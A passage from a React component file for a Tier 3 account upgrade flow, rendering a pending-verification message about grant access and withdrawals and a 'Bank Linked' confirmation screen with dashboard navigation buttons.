            <div className="p-8 space-y-8">
              <div className="rounded-lg border border-forest/20 bg-forest/5 p-8">
                <p className="text-foreground text-center leading-relaxed">
                  Thank you for upgrading to Tier 3. Your account has been successfully submitted for verification. 
                  Our review team is currently processing your request with careful attention to security and compliance. 
                  This process typically takes 24 hours, though it may require additional time depending on verification requirements. 
                  You will receive an email notification as soon as your upgrade is approved, at which point you'll have immediate 
                  access to unlimited grant applications and withdrawal capabilities. We appreciate your patience and recommend 
                  checking your email regularly for updates. Should you have any questions regarding your application status, 
                  please don't hesitate to contact our support team.
                </p>
              </div>

              <div className="rounded-lg border border-gold/30 bg-gold/5 p-6">
                <p className="font-semibold text-foreground mb-3">📋 What Happens Next?</p>
                <ol className="space-y-3 text-sm text-muted-foreground">
                  <li className="flex items-start gap-3">
                    <span className="inline-flex items-center justify-center w-6 h-6 rounded-full bg-gold text-primary text-xs font-bold flex-shrink-0">1</span>
                    <span>Our review team verifies your credentials and bank information</span>
                  </li>
                  <li className="flex items-start gap-3">
                    <span className="inline-flex items-center justify-center w-6 h-6 rounded-full bg-gold text-primary text-xs font-bold flex-shrink-0">2</span>
                    <span>We conduct security and compliance checks (24 hours typical)</span>
                  </li>
                  <li className="flex items-start gap-3">
                    <span className="inline-flex items-center justify-center w-6 h-6 rounded-full bg-gold text-primary text-xs font-bold flex-shrink-0">3</span>
                    <span>You'll receive an email confirmation once approved</span>
                  </li>
                  <li className="flex items-start gap-3">
                    <span className="inline-flex items-center justify-center w-6 h-6 rounded-full bg-gold text-primary text-xs font-bold flex-shrink-0">4</span>
                    <span>Full Tier 3 access activated immediately upon approval</span>
                  </li>
                </ol>
              </div>

              <button
                onClick={() => navigate({ to: "/dashboard" })}
                className="w-full py-4 rounded-lg bg-gradient-forest text-forest-foreground font-semibold hover:opacity-95 transition flex items-center justify-center gap-2"
              >
                <ArrowLeft className="h-4 w-4" />
                Return to Dashboard
              </button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  // SUCCESS STEP
  if (step === 'success') {
    return (
      <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
        <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
          <Logo />
        </header>

        <main className="mx-auto max-w-3xl px-6">
          <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
            <div className="bg-gradient-forest px-8 py-12 text-forest-foreground text-center">
              <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-white/20 mb-6 animate-bounce">
                <CheckCircle2 className="h-8 w-8 text-gold" />
              </div>
              <h2 className="font-display text-2xl font-semibold">Bank Linked!</h2>
              <p className="mt-2 text-white/80">Your account has been securely connected</p>
            </div>

            <div className="p-8 space-y-6">
              <div className="rounded-lg border border-forest/20 bg-forest/5 p-6">
                <p className="text-xs uppercase tracking-[0.18em] text-forest font-semibold mb-3">Linked Account</p>
                <p className="text-lg font-semibold text-foreground">{selectedBank?.name}</p>
              </div>

              <button
                onClick={() => navigate({ to: "/dashboard" })}
                className="w-full py-3.5 rounded-lg bg-gradient-forest text-forest-foreground font-semibold hover:opacity-95 transition flex items-center justify-center gap-2"
              >
                <ArrowLeft className="h-4 w-4" /> Back to Dashboard
              </button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  return null;
}

export default UpgradeTier3;
